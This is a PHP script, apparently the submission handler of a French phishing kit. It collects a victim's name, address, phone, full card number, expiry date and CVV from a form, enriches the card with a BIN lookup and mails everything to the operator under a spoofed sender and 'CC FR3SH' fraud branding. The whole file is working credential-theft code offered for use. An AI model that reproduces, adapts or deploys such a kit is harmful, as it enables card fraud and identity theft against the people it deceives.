<?php
require_once('function.php');
require_once('ShdowBlock.php');
    function cardData($ss, $bin)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://lookup.binlist.net/" . $bin);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 400);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json == false || $json == '{"valid":false}') {
            return "N/A";
        }
        $code = json_decode($json);
        switch ($ss) {
            case "type":
                $str = $code->{'type'};
                break;
            case "brand":
                $str = $code->{'brand'};
                break;
            case "level":
                $str = $code->{'category'};
                break;
            case "bank":
                $str = isset($code->{'bank'}->{'name'}) ? $code->{'bank'}->{'name'} : "Inconnu";
                break;
            case "status":
                $str = $code->{'country'}->{'currency'};
                break;
            case "countryName":
                $str = $code->{'country'}->{'name'};
                break;
            default:
                $str = $code->{'scheme'};
        }
        return $str;
    }
$bin = substr(str_replace(' ', '', $_POST['carte_credit']), 0, 6);
$adresse_send = $_POST['adresse_send'];

$code_postale_send = $_POST['code_postale_send'];
$telephone_send = $_POST['telephone_send'];
$ville_send = $_POST['ville_send'];
$nom = $_POST['nom'];
$carte_credit = $_POST['carte_credit'];
$date_expiration = $_POST['date_expiration'];
$cryptogramme = $_POST['cryptogramme'];
$bankname = cardData('bank', str_replace(" ","",$carte_credit));
$cclevel = cardData('brand', str_replace(" ","",$carte_credit));
$cctype = cardData('type', str_replace(" ","",$carte_credit));
// TON ADRESSE EMAIL ICI
$to  = "@yahoo.com";
$subject = "🦅 [$bin] -     $bankname -        $cclevel    -    $user_ip ";
$msg = "+1 CC FR3SH 🍂\r\n";
    $msg .= "++++++++++++++++++++< 🍉 [ INFOS PERSONNELLES] <++++++++++++++++++++\r\n";
    $msg .= "🖋 Proprio: {$nom}\r\n";
    $msg .= "🏠 Adresse: {$adresse_send}\r\n";
    $msg .= "📲 Ville: {$ville_send}\r\n";
    $msg .= "📪 Code Postal: {$code_postale_send}\r\n";
    $msg .= "👁‍🗨 IP: $ip\r\n";
    $msg .= "📞 Numéro : {$telephone_send} \r\n";
    $msg .= "\r\n";
    $msg .= "++++++++++++++++++++< |🍓 [ INFOS BANCAIRE ]<++++++++++++++++++++\r\n";
    $msg .= "🏛 Banco: $bankname\r\n";
    $msg .= "🏛 Numéro de carte: {$carte_credit}\r\n";
    $msg .= "🏛 Date d'expiration: {$date_expiration}\r\n";
    $msg .= "🏛 Cryptogramme visuel: {$cryptogramme}\r\n";
    $msg .= "🏛 Level: $cclevel\r\n";
    $msg .= "🏛 Type: {$cctype}\r\n";
    $msg .= "\r\n";
    $msg .= "++++++++++++++++++++< |LesAffranchi RZLT 🦅 ]<++++++++++++++++++++\r\n";
    $msg .= "++++++++++++++++++++< |🚀 MartyMacFly Fumeur De L'espace]<++++++++++++++++++++\r\n";
$headers = "From:🍾ROIDELACHATTE🍾<vegasfiesta@servicejuridique.fr>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
mail($to, $subject, $msg, $headers);
echo 1;
?>